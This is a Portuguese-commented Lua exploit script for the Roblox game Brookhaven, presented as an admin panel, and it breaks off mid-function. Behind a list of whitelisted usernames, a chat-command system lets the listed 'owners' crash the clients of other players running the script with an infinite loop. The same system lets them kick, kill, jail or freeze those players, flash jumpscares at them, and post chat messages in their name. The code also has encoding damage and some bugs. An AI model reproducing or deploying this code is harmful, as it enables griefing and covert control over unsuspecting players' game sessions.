-- DemonClient - Painel Admin | Brookhaven
-- Desenvolvido por: Over

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")

-- ===== SISTEMA DE WHITELIST =====
local function getCurrentTimestamp()
    return os.time()
end

local function parseDateTime(dateString)
    -- Formato: "dd/mm/aaaa hh:mm"
    local day, month, year, hour, minute = dateString:match("(%d+)/(%d+)/(%d+) (%d+):(%d+)")
    if day and month and year and hour and minute then
        return os.time({
            day = tonumber(day),
            month = tonumber(month),
            year = tonumber(year),
            hour = tonumber(hour),
            min = tonumber(minute),
            sec = 0
        })
    end
    return nil
end

-- Sistema de Whitelist com ExpiraÃ§Ã£o
local WhitelistData = {
    -- Donos (sem expiraÃ§Ã£o)
    ["hiro0881"] = {type = "Dono", expires = nil},
    ["drakeee777"] = {type = "Staff", expires = nil},
    ["testerscript88"] = {type = "Dono", expires = nil},
    ["rmss_2012"] = {type = "Staff", expires = nil},
    ["eltulio69"] = {type = "usuario adm", expires = nil},
    ["covefred"] = {type = "usuario adm", expires = nil},
    ["goku_blackpao"] = {type = "usuario adm", expires = nil},
    ["miuuq_333"] = {type = "usuario adm", expires = nil},
    
    -- UsuÃ¡rios ADM com expiraÃ§Ã£o
    ["cartolahub7"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/12/2030 23:59")},
    ["misterio_zeusmod"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/04/2026 23:59")},
    ["caiozn7_669"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/12/2030 23:59")},
    ["donarzissus"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/12/2030 23:59")},
    ["vampzinkkj_1"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/12/2030 23:59")},
    ["ppyszt"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("7/01/2026 18:30")},
    ["pedro_roneido"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("10/01/2030 12:00")},
    ["pedro_roneido20"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("10/01/2030 12:00")},
    ["ixi362"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("05/01/2030 15:45")},
    ["jifhgiu"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("25/12/2030 20:00")},
    ["piloto158d"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("30/12/2030 14:20")},
    ["rafaelgms7810396"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("25/12/2030 20:00")},
    ["ilu1_22"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("08/01/2030 10:30")},
    ["xmarcelo_27262"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("12/01/2030 16:15")},
    ["ryansididd"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("03/01/2030 09:00")},
    ["redz_hub99975"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("28/12/2030 22:45")},
    ["teteu0902201mc"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("15/01/2030 11:30")},
    ["amongus23445844sad"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("18/12/2030 19:20")},
    ["ttyyryjuh"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("22/12/2030 13:10")},
    ["kevin_oliverra10"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("07/01/2030 17:40")},
    ["drakeee777"] = {type = "dono", expires = parseDateTime("29/12/2030 21:15")},
    ["eduard0k0"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("14/01/2030 08:50")},
    ["gh707080s"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("31/12/2030 23:59")},
    ["luroblox1262"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("06/01/2030 14:25")},
    ["bonasamigo"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("19/10/2030 14:30")},
    ["manopp72"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("25/10/2025 18:40")},
    ["zack_89901"] = {type = "UsuÃ¡rio adm", expires = parseDateTime("25/10/2025 18:40")},
    ["rackffr9"] = {type = "UsuÃ¡rio add", expires = parseDateTime("20/11/2025 18:40")},
    ["oibuto7"] = {type = "UsuÃ¡rio add", expires = parseDateTime("31/10/2025 14:40")},
    ["ensisbsjbrhe"] = {type = "UsuÃ¡rio add", expires = parseDateTime("09/10/2030 19:40")},
    ["gui_neh1023"] = {type = "UsuÃ¡rio add", expires = parseDateTime("09/10/2030 19:40")},
    ["killert_494"] = {type = "UsuÃ¡rio add", expires = parseDateTime("09/10/2030 19:40")},
}

-- FunÃ§Ã£o para verificar se usuÃ¡rio estÃ¡ na whitelist e nÃ£o expirou
local function isUserWhitelisted(username)
    local userData = WhitelistData[username:lower()]
    if not userData then
        return false, "NÃ£o estÃ¡ na whitelist"
    end
    
    -- Verificar expiraÃ§Ã£o
    if userData.expires then
        local currentTime = getCurrentTimestamp()
        if currentTime > userData.expires then
            return false, "Whitelist expirada em " .. os.date("%d/%m/%Y %H:%M", userData.expires)
        end
    end
    
    return true, userData.type
end

-- VERIFICAÃ‡ÃƒO INICIAL - Se nÃ£o estiver na whitelist ou expirou, kicka imediatamente
local function verifyWhitelistOnStart()
    local username = LocalPlayer.Name:lower()
    local isWhitelisted, reason = isUserWhitelisted(username)
    
    if not isWhitelisted then
        -- Espera um pouco para carregar e depois kicka
        task.wait(2)
        if reason:find("expirada") then
            LocalPlayer:Kick("âŒ SUA WHITELIST EXPIROU!\n\nData de expiraÃ§Ã£o: " .. reason:match("expirada em (.+)"))
        else
            LocalPlayer:Kick("âŒ VOCÃŠ NÃƒO ESTÃ NA WHITELIST!\n\nEntre em contato com o desenvolvedor.")
        end
        return false
    end
    
    return true
end

-- Executa a verificaÃ§Ã£o inicial
if not verifyWhitelistOnStart() then
    return -- Para a execuÃ§Ã£o do script se nÃ£o passou na whitelist
end

-- ===== SISTEMA DE COMANDOS DO SCRIPT ABAIXO =====
-- ðŸš¨ ConfiguraÃ§Ã£o de Donos e Moderadores
local DONOS = {
    ["hiro0881"] = true,
    ["jifhgiu"] = true,
    ["cartolahub7"] = true,
    ["ppyszt"] = true,
    ["pedro_roneido"] = true,
    ["pedro_roneido20"] = true,
    ["ixi362"] = true,
    ["rafaelgms7810396"] = true,
    ["piloto158d"] = true,
    ["rafaelgms67901"] = true,
    ["ilu1_22"] = true,
    ["xmarcelo_27262"] = true,
    ["ryansididd"] = true,
    ["redz_hub99975"] = true,
    ["amongus234458444sad"] = true,
    ["teteu0902201mc"] = true,
    ["ttyyryjuh"] = true,
    ["kevin_oliverra10"] = true,
}
local MODS = {
    ["hiro0881"] = true,
    ["jifhgiu"] = true,
    ["cartolahub7"] = true,
    ["ppyszt"] = true,
    ["pedro_roneido"] = true,
    ["pedro_roneido20"] = true,
    ["ixi362"] = true,
    ["rafaelgms7810396"] = true,
    ["piloto158d"] = true,
    ["rafaelgms67901"] = true,
    ["ilu1_22"] = true,
    ["xmarcelo_27262"] = true,
    ["ryansididd"] = true,
    ["redz_hub99975"] = true,
    ["amongus234458444sad"] = true,
    ["teteu0902201mc"] = true,
    ["ttyyryjuh"] = true,
    ["kevin_oliverra10"] = true,
}
local TEMP_MODS = {
    ["hiro0881"] = true,
    ["jifhgiu"] = true,
    ["cartolahub7"] = true,
    ["ppyszt"] = true,
    ["pedro_roneido"] = true,
    ["pedro_roneido20"] = true,
    ["ixi362"] = true,
    ["rafaelgms7810396"] = true,
    ["piloto158d"] = true,
    ["rafaelgms67901"] = true,
    ["ilu1_22"] = true,
    ["xmarcelo_27262"] = true,
    ["ryansididd"] = true,
    ["redz_hub99975"] = true,
    ["amongus234458444sad"] = true,
    ["teteu0902201mc"] = true,
    ["ttyyryjuh"] = true,
    ["kevin_oliverra10"] = true,
}

local function IsDono(n) return DONOS[n] == true end
local function IsMod(n) return MODS[n] == true end
local function IsTempMod(n) return TEMP_MODS[n] == true end
local function IsAutorizado(n) return IsDono(n) or IsMod(n) or IsTempMod(n) end

-- ðŸš¨ ATENÃ‡ÃƒO: VERIFIQUE SE O CAMINHO PARA OS REMOTES ESTÃ CORRETO!
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

-- ðŸ§  VariÃ¡veis de Estado
local OVER_USERS = {}
local tagsVisiveis = true
local JAILED_PLAYERS = {}
local FROZEN_PLAYERS = {}

-- ConfiguraÃ§Ã£o de Jumpscares
local JUMPSCARES = {
    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

-- FunÃ§Ãµes de AÃ§Ã£o (Freeze, Unfreeze, Jail, Unjail, Float, KillPlus, Jumpscare)
local function FreezePlayer(player)
    if not player or not player.Character then return false end
    local h = player.Character:FindFirstChildOfClass("Humanoid")
    if not h or FROZEN_PLAYERS[player.Name] then return false end
    FROZEN_PLAYERS[player.Name] = { WalkSpeed = h.WalkSpeed, JumpPower = h.JumpPower }
    h.WalkSpeed = 0
    h.JumpPower = 0
    return true
end

local function UnfreezePlayer(player)
    if not player or not FROZEN_PLAYERS[player.Name] then return false end
    local s = FROZEN_PLAYERS[player.Name]
    if player.Character then
        local h = player.Character:FindFirstChildOfClass("Humanoid")
        if h then
            h.WalkSpeed = s.WalkSpeed
            h.JumpPower = s.JumpPower
        end
    end
    FROZEN_PLAYERS[player.Name] = nil
    return true
end

local function CreateAndManageJail(player)
    if not player or not player.Character then return false end
    local e = Workspace:FindFirstChild("Jail_" .. player.Name)
    if e then e:Destroy() end
    if JAILED_PLAYERS[player.Name] and JAILED_PLAYERS[player.Name].loop then
        task.cancel(JAILED_PLAYERS[player.Name].loop)
    end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local m = Instance.new("Model", Workspace)
    m.Name = "Jail_" .. player.Name
    local s = 8
    local p = hrp.Position
    local t = {
        Base = Instance.new("Part", m),
        Roof = Instance.new("Part", m),
        Wall1 = Instance.new("Part", m),
        Wall2 = Instance.new("Part", m),
        Wall3 = Instance.new("Part", m),
        Wall4 = Instance.new("Part", m)
    }
    t.Base.Size = Vector3.new(s, 0.5, s)
    t.Base.Position = p - Vector3.new(0, player.Character.Humanoid.HipHeight + 0.25, 0)
    t.Roof.Size = Vector3.new(s, 0.5, s)
    t.Roof.Position = t.Base.Position + Vector3.new(0, s, 0)
    t.Wall1.Size = Vector3.new(0.5, s, s)
    t.Wall1.Position = t.Base.Position + Vector3.new(s / 2, s / 2, 0)
    t.Wall2.Size = Vector3.new(0.5, s, s)
    t.Wall2.Position = t.Base.Position - Vector3.new(s / 2, -s / 2, 0)
    t.Wall3.Size = Vector3.new(s, s, 0.5)
    t.Wall3.Position = t.Base.Position + Vector3.new(0, s / 2, s / 2)
    t.Wall4.Size = Vector3.new(s, s, 0.5)
    t.Wall4.Position = t.Base.Position - Vector3.new(0, -s / 2, s / 2)
    for _, v in pairs(t) do
        v.Anchored = true
        v.CanCollide = true
        v.Material = Enum.Material.Neon
        v.Color = Color3.fromRGB(0, 200, 255)
        v.Transparency = 0.6
    end
    if player == LocalPlayer then
        local l = task.spawn(function()
            local c = t.Base.Position + Vector3.new(0, player.Character.Humanoid.HipHeight, 0)
            while JAILED_PLAYERS[player.Name] and player.Parent and player.Character and player.Character.Parent do
                local h = player.Character:FindFirstChild("HumanoidRootPart")
                if h and (h.Position - c).Magnitude > (s / 2) - 1 then
                    h.CFrame = CFrame.new(c)
                end
                task.wait(0.1)
            end
        end)
        JAILED_PLAYERS[player.Name] = { loop = l }
    else
        JAILED_PLAYERS[player.Name] = {}
    end
    return true
end

local function RemoveJail(player)
    local w = Workspace:FindFirstChild("Jail_" .. player.Name)
    if w then w:Destroy() end
    if not player or not JAILED_PLAYERS[player.Name] then return false end
    local d = JAILED_PLAYERS[player.Name]
    if d.loop then task.cancel(d.loop) end
    JAILED_PLAYERS[player.Name] = nil
    return true
end

local function FloatPlayer(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") then return false end
    local targetHrp = player.Character.HumanoidRootPart
    local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local targetPos = targetHrp.Position

    targetHumanoid.WalkSpeed = 0
    targetHumanoid.JumpHeight = 0

    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
    bodyVelocity.Name = "FloatVelocity"

    local maxHeight = targetPos.Y + 50
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        if not player.Character or not player.Character.Parent or not targetHrp.Parent or not targetHumanoid.Parent then
            bodyVelocity:Destroy()
            connection:Disconnect()
            return
        end
        if targetHrp.Position.Y >= maxHeight then
            bodyVelocity:Destroy()
            connection:Disconnect()
            targetHumanoid.Health = 0
        end
    end)
    return true
end

local function KillPlus(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return false end
    local targetHrp = player.Character.HumanoidRootPart
    local targetPos = targetHrp.Position

    local parts = {}
    local numParts = 5
    for i = 1, numParts do
        local part = Instance.new("Part", Workspace)
        part.Name = "KillPlusPart_" .. player.Name .. "_" .. i
        part.Size = Vector3.new(2, 2, 2)
        part.Position = targetPos + Vector3.new(math.random(-10, 10), -5, math.random(-10, 10))
        part.Anchored = true
        part.CanCollide = true
        part.Material = Enum.Material.Neon
        part.Color = Color3.fromRGB(255, 0, 0)
        table.insert(parts, part)
    end

    local speed = 50
    for _, part in ipairs(parts) do
        local distance = (targetPos - part.Position).Magnitude
        local duration = distance / speed
        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
        local tween = TweenService:Create(part, tweenInfo, { Position = targetPos + Vector3.new(0, 1, 0) })
        part.Anchored = false
        tween:Play()

        part.Touched:Connect(function(hit)
            if hit.Parent == player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyVelocity.Velocity = Vector3.new(math.random(-50, 50), 100, math.random(-50, 50))
                game:GetService("Debris"):AddItem(bodyVelocity, 0.5)
            end
        end)
    end

    game:GetService("Debris"):AddItem(Instance.new("Folder", Workspace), 5):GetChildren()[1]:Add(parts)
    return true
end

local function TriggerJumpscare(player, jumpscare)
    if not player or player ~= LocalPlayer then return false end
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "JumpscareGui"
    screenGui.IgnoreGuiInset = true
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = jumpscare.ImageId
    local sound = Instance.new("Sound", screenGui)
    sound.SoundId = jumpscare.AudioId
    sound.Volume = 1
    sound.Looped = false
    sound:Play()
    local flashCount = 10
    local flashInterval = 0.2
    for i = 1, flashCount do
        if not screenGui.Parent then break end
        imageLabel.ImageTransparency = (i % 2 == 0) and 0.3 or 0
        task.wait(flashInterval)
    end
    sound:Stop()
    screenGui:Destroy()
    return true
end

-- FunÃ§Ã£o para Encontrar Jogador por Nome Parcial
local function findPlayerByPartialName(partialName)
    if not partialName or partialName == "" then return nil end
    local lowerPartialName = partialName:lower():gsub("%s+", "")
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(lowerPartialName, 1, true) or p.DisplayName:lower():find(lowerPartialName, 1, true) then
            return p
        end
    end
    return nil
end

-- Manipulador de Chat
local function analisarChatDe(chatter, message)
    local msg = message:lower():gsub("%s+", " ")
    local args = {}
    for word in msg:gmatch("%S+") do
        table.insert(args, word)
    end

    -- Verificar ;verifique
    if msg == ";verifique" then
        if not IsAutorizado(chatter.Name) then
            if chatter == LocalPlayer then
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[Light Hub] âŒ VocÃª nÃ£o tem permissÃ£o para usar ;verifique.",
                    Color = Color3.fromRGB(255, 100, 100),
                    Font = Enum.Font.GothamBold
                })
            end
            return
        end
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] Comando ;verifique detectado de " .. chatter.Name,
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.GothamBold
        })
        if not IsAutorizado(LocalPlayer.Name) then
            task.delay(math.random(0.1, 0.8), function()
                pcall(function()
                    local channel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral") or TextChatService:WaitForChild("TextChannels"):GetChildren()[1]
                    if channel then
                        channel:SendAsync("Over_Users")
                        StarterGui:SetCore("ChatMakeSystemMessage", {
                            Text = "[Light Hub] " .. LocalPlayer.Name .. " respondeu com Over_Users",
                            Color = Color3.fromRGB(0, 255, 0),
                            Font = Enum.Font.GothamBold
                        })
                    end
                end)
            end)
        end
        return
    end

    -- Detectar Over_Users
    if msg == "over_users" then
        over_USERS[chatter.Name] = true
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] " .. chatter.Name .. " identificado como UsuÃ¡rio Light",
            Color = Color3.fromRGB(170, 0, 255),
            Font = Enum.Font.GothamBold
        })
        return
    end

    -- Restringir outros comandos a autorizados
    if not IsAutorizado(chatter.Name) then
        if chatter == LocalPlayer then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[Light Hub] âŒ VocÃª nÃ£o tem permissÃ£o para usar este comando.",
                Color = Color3.fromRGB(255, 100, 100),
                Font = Enum.Font.GothamBold
            })
        end
        return
    end

    -- Manipular ;ch
    if args[1] == ";ch" and #args >= 3 then
        local targetPartialName = args[2]
        local messageToSend = table.concat(args, " ", 3)
        local targetPlayer = findPlayerByPartialName(targetPartialName)
        if targetPlayer and targetPlayer == LocalPlayer and messageToSend ~= "" then
            pcall(function()
                local channel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral") or TextChatService:WaitForChild("TextChannels"):GetChildren()[1]
                if channel then
                    channel:SendAsync(messageToSend)
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[Light Hub] Mensagem enviada como " .. targetPlayer.Name,
                        Color = Color3.fromRGB(0, 255, 0),
                        Font = Enum.Font.GothamBold
                    })
                end
            end)
        elseif chatter == LocalPlayer then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[Light Hub] âŒ Jogador alvo nÃ£o encontrado ou mensagem invÃ¡lida.",
                Color = Color3.fromRGB(255, 100, 100),
                Font = Enum.Font.GothamBold
            })
        end
        return
    end

    -- Manipular jumpscares
    for _, jumpscare in ipairs(JUMPSCARES) do
        if args[1] == jumpscare.Name and #args == 2 then
            local targetPlayer = findPlayerByPartialName(args[2])
            if targetPlayer then
                if TriggerJumpscare(targetPlayer, jumpscare) and chatter == LocalPlayer then
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[Light Hub] " .. jumpscare.Name .. " acionado em " .. targetPlayer.Name,
                        Color = Color3.fromRGB(0, 255, 0),
                        Font = Enum.Font.GothamBold
                    })
                end
            elseif chatter == LocalPlayer then
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[Light Hub] âŒ Jogador alvo nÃ£o encontrado.",
                    Color = Color3.fromRGB(255, 100, 100),
                    Font = Enum.Font.GothamBold
                })
            end
            return
        end
    end

    -- Manipular outros comandos
    local targetCommands = { ";kick", ";crash", ";kill", ";killplus", ";bring", ";jail", ";unjail", ";freeze", ";unfreeze", ";adm", ";unadm", ";float" }
    if table.find(targetCommands, args[1]) and #args == 2 then
        local targetPlayer = findPlayerByPartialName(args[2])
        if not targetPlayer then
            if chatter == LocalPlayer then
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[Light Hub] âŒ Jogador alvo nÃ£o encontrado.",
                    Color = Color3.fromRGB(255, 100, 100),
                    Font = Enum.Font.GothamBold
                })
            end
            return
        end
        local success = false
        if args[1] == ";jail" then
            success = CreateAndManageJail(targetPlayer)
        elseif args[1] == ";unjail" then
            success = RemoveJail(targetPlayer)
        elseif args[1] == ";freeze" then
            success = FreezePlayer(targetPlayer)
        elseif args[1] == ";unfreeze" then
            success = UnfreezePlayer(targetPlayer)
        elseif args[1] == ";adm" and IsDono(chatter.Name) then
            TEMP_MODS[targetPlayer.Name] = true
            success = true
        elseif args[1] == ";unadm" and IsDono(chatter.Name) then
            TEMP_MODS[targetPlayer.Name] = nil
            success = true
        elseif args[1] == ";kick" then
            if targetPlayer == LocalPlayer and IsDono(LocalPlayer.Name) and not IsDono(chatter.Name) then
                if chatter == LocalPlayer then
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[Light Hub] âŒ VocÃª nÃ£o pode expulsar um dono.",
                        Color = Color3.fromRGB(255, 100, 100),
                        Font = Enum.Font.GothamBold
                    })
                end
                return
            end
            targetPlayer:Kick("VocÃª foi removido pelos seus atos --equipe Light")
            success = true
        elseif args[1] == ";kill" then
            if targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
                targetPlayer.Character.Humanoid.Health = 0
                success = true
            end
        elseif args[1] == ";killplus" then
            success = KillPlus(targetPlayer)
        elseif args[1] == ";bring" then
            if chatter.Character and chatter.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                targetPlayer.Character:SetPrimaryPartCFrame(chatter.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5))
                success = true
            end
        elseif args[1] == ";crash" then
            if targetPlayer == LocalPlayer then
                while true do
                    Instance.new("Part")
                end
            end
            success = true
        elseif args[1] == ";float" then
            success = FloatPlayer(targetPlayer)
        end
        if chatter == LocalPlayer and success then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[Light Hub] " .. args[1] .. " executado com sucesso em " .. targetPlayer.Name,
                Color = Color3.fromRGB(0, 255, 0),
                Font = Enum.Font.GothamBold
            })
        elseif chatter == LocalPlayer then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[Light Hub] âŒ Falha ao executar " .. args[1] .. " em " .. targetPlayer.Name .. ". Verifique se o jogador estÃ¡ no jogo.",
                Color = Color3.fromRGB(255, 100, 100),
                Font = Enum.Font.GothamBold
            })
        end
        return
    end

    -- Comandos de Controle de Tags
    if msg == ";untag all" then
        tagsVisiveis = false
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] Todas as tags removidas.",
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.GothamBold
        })
        return
    end
    if msg == ";tag all" then
        tagsVisiveis = true
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] Todas as tags restauradas.",
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.GothamBold
        })
        return
    end
    if msg == ";untag" and chatter == LocalPlayer then
        tagsVisiveis = false
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] Tags removidas para " .. LocalPlayer.Name,
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.GothamBold
        })
        return
    end
    if msg == ";tag" and chatter == LocalPlayer then
        tagsVisiveis = true
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "[Light Hub] Tags restauradas para " .. LocalPlayer.Name,
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.GothamBold
        })
        return
    end
end

-- Conectar eventos de chat
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        analisarChatDe(player, message)
    end)
end
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        analisarChatDe(player, message)
    end)
end)

-- ===== SISTEMA ORIGINAL DO LIGHTCLIENT =====
-- Sistema de Tags
local function createSpecialTag(player, tagText)
    local char = player.Character  
    if not char then return end  
    local head = char:FindFirstChild("Head")  
    if not head then return end  
    local old = head:FindFirstChild("SpecialTag")  
    if old then old:Destroy() end  
    
    local billboardGui = Instance.new("BillboardGui")  
    billboardGui.Name = "SpecialTag"  
    billboardGui.Size = UDim2.new(0, 200, 0, 50)  
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)  
    billboardGui.Adornee = head  
    billboardGui.AlwaysOnTop = true  
    billboardGui.Parent = head  
    
    local frame = Instance.new("Frame")  
    frame.Size = UDim2.new(1, 0, 1, 0)  
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
    frame.BackgroundTransparency = 0.5  
    frame.BorderSizePixel = 0  
    frame.Parent = billboardGui  
    
    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 12)  
    corner.Parent = frame  
    
    local textLabel = Instance.new("TextLabel")  
    textLabel.Size = UDim2.new(1, 0, 1, 0)  
    textLabel.BackgroundTransparency = 1  
    textLabel.Text = tagText  
    textLabel.TextColor3 = Color3.fromRGB(170, 0, 255) -- Roxo
    textLabel.TextScaled = true  
    textLabel.Font = Enum.Font.GothamBold  
    textLabel.TextStrokeTransparency = 0.5  
    textLabel.Parent = frame
end

local function applyTag(player)
    local isWhitelisted, tagType = isUserWhitelisted(player.Name:lower())
    if isWhitelisted then  
        player.CharacterAdded:Connect(function()  
            task.wait(1)  
            createSpecialTag(player, tagType)  
        end)  
        if player.Character then  
            task.wait(1)  
            createSpecialTag(player, tagType)  
        end  
    end
end

-- Aplicar tags nos jogadores
for _, p in ipairs(Players:GetPlayers()) do
    applyTag(p)
end

Players.PlayerAdded:Connect(function(p)
    applyTag(p)
end)

-- ===== VARIÃVEIS PARA FREEZE E JAIL =====
local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}

-- ===== SISTEMA DO MONSTRO DAS BACKROOMS =====
local backroomsMonster = nil
local monsterActive = false

-- ===== FUNÃ‡ÃƒO PARA CRIAR O MONSTRO COM IMAGEM =====
local function CreateBackroomsMonster(position)
    local monsterFolder = Instance.new("Folder")
    monsterFolder.Name = "BackroomsMonster"
    
    -- Criar parte principal do monstro
    local monsterPart = Instance.new("Part")
    monsterPart.Name = "MonsterBody"
    monsterPart.Size = Vector3.new(8, 12, 8)
    monsterPart.Position = position
    monsterPart.Anchored = true
    monsterPart.CanCollide = true
    monsterPart.Material = Enum.Material.SmoothPlastic
    monsterPart.BrickColor = BrickColor.new("Really black")
    monsterPart.Parent = monsterFolder
    
    -- Criar decal/textura com a imagem do monstro
    local monsterDecal = Instance.new("Decal")
    monsterDecal.Name = "MonsterFace"
    monsterDecal.Texture = "rbxassetid://126754882337711"
    monsterDecal.Face = Enum.NormalId.Front
    monsterDecal.Parent = monsterPart
    
    -- Adicionar decal nas outras faces tambÃ©m
    local decalBack = Instance.new("Decal")
    decalBack.Texture = "rbxassetid://126754882337711"
    decalBack.Face = Enum.NormalId.Back
    decalBack.Parent = monsterPart
    
    local decalLeft = Instance.new("Decal")
    decalLeft.Texture = "rbxassetid://126754882337711"
    decalLeft.Face = Enum.NormalId.Left
    decalLeft.Parent = monsterPart
    
    local decalRight = Instance.new("Decal")
    decalRight.Texture = "rbxassetid://126754882337711"
    decalRight.Face = Enum.NormalId.Right
    decalRight.Parent = monsterPart
    
    -- Luz vermelha assustadora
    local monsterLight = Instance.new("PointLight")
    monsterLight.Brightness = 5
    monsterLight.Range = 20
    monsterLight.Color = Color3.fromRGB(255, 0, 0)
    monsterLight.Parent = monsterPart
    
    -- PartÃ­culas de fumaÃ§a vermelha
    local smokeParticles = Instance.new("ParticleEmitter")
    smokeParticles.Texture = "rbxassetid://243664672"
    smokeParticles.Lifetime = NumberRange.new(1, 3)
    smokeParticles.Rate = 25
    smokeParticles.SpreadAngle = Vector2.new(45, 45)
    smokeParticles.Speed = NumberRange.new(2, 4)
    smokeParticles.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))
    smokeParticles.Transparency = NumberSequence.new(0.3, 0.8)
    smokeParticles.Size = NumberSequence.new(1, 3)
    smokeParticles.Parent = monsterPart
    
    -- Som do monstro
    local monsterSound = Instance.new("Sound")
    monsterSound.SoundId = "rbxassetid://138873214826309"
    monsterSound.Volume = 1.5
    monsterSound.Looped = true
    monsterSound.Parent = monsterPart
    monsterSound:Play()
    
    -- Efeito de pulsaÃ§Ã£o na luz
    coroutine.wrap(function()
        while monsterPart.Parent do
            monsterLight.Brightness = 8
            wait(0.5)
            monsterLight.Brightness = 3
            wait(0.5)
        end
    end)()
    
    return monsterFolder
end

-- ===== FUNÃ‡ÃƒO PARA ATIVAR O MONSTRO =====
local function ActivateMonster(player)
    if not player or not player.Character then return end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    -- Criar monstro se nÃ£o existir
    if not backroomsMonster then
        local monsterPosition = humanoidRootPart.Position + Vector3.new(25, 0, 0)
        backroomsMonster = CreateBackroomsMonster(monsterPosition)
        backroomsMonster.Parent = workspace
    end
    
    monsterActive = true
    
    -- Sistema de perseguiÃ§Ã£o do monstro
    local monsterBody = backroomsMonster:FindFirstChild("MonsterBody")
    if not monsterBody then return end
    
    -- Jumpscare inicial apÃ³s 2 segundos
    task.wait(2)
    
    -- Criar jumpscare assustador
    local screenGui = Instance.new("ScreenGui", CoreGui)
